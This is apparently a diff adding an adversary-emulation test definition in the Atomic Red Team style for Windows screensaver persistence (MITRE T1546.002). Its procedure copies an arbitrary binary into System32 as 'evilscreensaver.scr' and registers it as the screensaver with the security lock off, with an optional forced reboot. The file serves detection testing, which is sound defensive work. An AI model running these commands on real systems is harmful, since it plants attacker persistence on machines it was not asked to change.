@@ -1,0 +1,34 @@
+{
+  "attack_technique": "T1546.002",
+  "display_name": "Event Triggered Execution: Screensaver",
+  "atomic_tests": [
+    {
+      "name": "Set Arbitrary Binary as Screensaver",
+      "description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "command_prompt",
+        "elevation_required": true,
+        "cleanup_command": "reg import %userprofile%\\backup.reg\ndel %userprofile%\\backup.reg\ndel %SystemRoot%\\System32\\evilscreensaver.scr",
+        "procedure": "reg export \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" %userprofile%\\backup.reg\ncopy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nif #{reboot} NEQ 0 shutdown /r /t 0"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "input_binary",
+          "description": "Executable binary to use in place of screensaver for persistence",
+          "type": "path",
+          "default": "C:\\Windows\\System32\\cmd.exe"
+        },
+        {
+          "arg_name": "reboot",
+          "description": "Set to non-zero value if you want the test to reboot the system so that changes take effect",
+          "type": "integer",
+          "default": "0"
+        }
+      ],
+      "auto_generated_guid": "281201e7-de41-4dc9-b73d-f288938cbb64"
+    }
+  ]
+}
